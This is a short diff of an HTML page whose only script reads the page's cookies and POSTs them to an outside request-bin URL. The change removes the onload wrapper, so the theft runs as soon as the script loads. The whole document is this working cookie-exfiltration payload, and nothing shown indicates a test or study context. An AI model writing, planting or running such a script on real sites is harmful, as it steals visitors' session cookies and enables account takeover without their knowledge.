@@ -5,20 +5,17 @@
 </head>
 <body>
 <script>
-    window.onload = function() {
-        const cookies = document.cookie;
-        const headers = new Headers()
-        headers.append("Content-Type", "application/json")
+    const headers = new Headers()
+    headers.append("Content-Type", "application/json")
 
-        const options = {
-        method: "POST",
-        headers,
-        mode: "cors",
-        body: cookies,
-        }
-
-        fetch("https://requestbin.kanbanbox.com/1mazijq1", options)
+    const options = {
+    method: "POST",
+    headers,
+    mode: "cors",
+    body: document.cookie,
     }
+
+    fetch("https://requestbin.kanbanbox.com/1mazijq1", options)
 </script>
 </body>
 </html>
